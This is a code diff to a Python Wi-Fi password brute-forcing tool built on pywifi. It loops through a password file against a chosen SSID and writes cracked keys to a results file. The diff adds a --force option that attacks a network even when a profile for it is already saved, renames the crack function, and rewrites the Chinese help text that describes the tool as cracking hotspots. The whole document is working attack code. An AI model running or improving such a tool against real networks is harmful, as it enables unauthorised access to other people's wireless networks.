@@ -6,10 +6,10 @@ import pywifi
 from pywifi import const  # 引用一些定义
 from tqdm import tqdm
 
-from cracker_util import get_aps, crack_ap, sample_passwords
+from cracker_util import get_aps, try_connect, sample_passwords
 
 
-def main(password_file, ssid, iface_name=None, result_file='results.txt', stype=0):
+def main(password_file, ssid, force=False, iface_name=None, result_file='results.txt', stype=0):
     if not os.path.isfile(password_file):
         print('[!]密码本文件不存在')
         return
@@ -33,9 +33,15 @@ def main(password_file, ssid, iface_name=None, result_file='results.txt', stype=
                 print('[-]不存在名称为%s的无线网卡' % (iface_name))
                 return
 
-    if ssid in [profile.ssid for profile in iface.network_profiles()]:
-        print('[*]此(SSID:%s)已经存在电脑中' % ssid)
-        return
+    network_profiles = iface.network_profiles()
+    for profile in network_profiles:
+        if ssid == profile.ssid:
+            print('[*]此(SSID:%s)已经存在电脑中' % ssid)
+            if not force:
+                return
+            else:
+                print('[*]强制破解(SSID:%S)' % ssid)
+            break
 
     print('[+]导入密码本')
     passwords = []
@@ -59,7 +65,7 @@ def main(password_file, ssid, iface_name=None, result_file='results.txt', stype=
 
     for key in tqdm(sample_passwords(passwords, stype), desc='Passwords'):
         profile.key = key
-        if crack_ap(iface, profile):
+        if try_connect(iface, profile):
             with open(result_file, 'a') as f:
                 f.write('%s : %s\n' % (ssid, key))
             print('[*]使用密码 %s 破解 %s成功' % (key, ssid))
@@ -73,10 +79,11 @@ def __main__():
 
     parser = argparse.ArgumentParser(description='暴力破解指定SSID的热点')
     parser.add_argument('password_file', type=str, help='密码本文件')
-    parser.add_argument('ssid', type=str, help='所要破解的 SSID 名称')
-    parser.add_argument('--iface_name', type=str,
-                        help='无限网卡名称，' +
-                        'window系统可以通过设备管理器查看，' +
+    parser.add_argument('ssid', type=str, help='所要破解的SSID名称')
+    parser.add_argument('-f', '--force', action='store_true',
+                        help='强制破解SSID的网卡，忽略同名热点')
+    parser.add_argument('-i', '--iface_name', type=str,
+                        help='无限网卡名称，window系统可以通过设备管理器查看，' +
                         'linux系统可在/var/run/wpa_supplicant/中查看。' +
                         '默认为第一个网卡设备。')
     parser.add_argument('--result_file', type=str,
@@ -85,7 +92,7 @@ def __main__():
                         help=sample_passwords.__doc__+'，默认为0')
     args = parser.parse_args()
 
-    main(args.password_file, args.ssid,
+    main(args.password_file, args.ssid, force=args.force,
          iface_name=args.iface_name, result_file=args.result_file, stype=args.stype)
 
 
